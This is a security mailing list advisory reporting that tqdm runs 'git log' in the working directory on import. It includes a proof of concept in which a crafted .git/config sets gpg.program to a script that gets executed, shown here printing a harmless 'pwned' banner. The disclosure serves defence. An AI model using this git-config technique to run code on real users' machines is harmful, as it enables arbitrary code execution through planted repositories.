When you import tqdm, the tqdm._version module executes the following command:      git log -n 1 --oneline  This was meant to check if the user is running a pre-release version of tqdm. But cwd might be a part of an unrelated git repository, possibly a malicious  one. At least with git or later, it's possible to craft a repo in which  "git log" executes arbitrary code:      $ tail -n4 /tmp/.git/config     [log]             showSignature = true     [gpg]             program = /tmp/moogpg      $ tail -n4 /tmp/moogpg     #!/bin/sh     exec > /dev/tty 2>&1     cowsay pwned     sleep      $ cd /tmp      $ pydoc tqdm      _______     < pwned >      -------             \   ^__^              \  (oo)\_______                 (__)\       )\/\                     ||----w |                     ||     ||   Upstream bug report:  Affected versions: and later.  --  Jakub Wilk  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
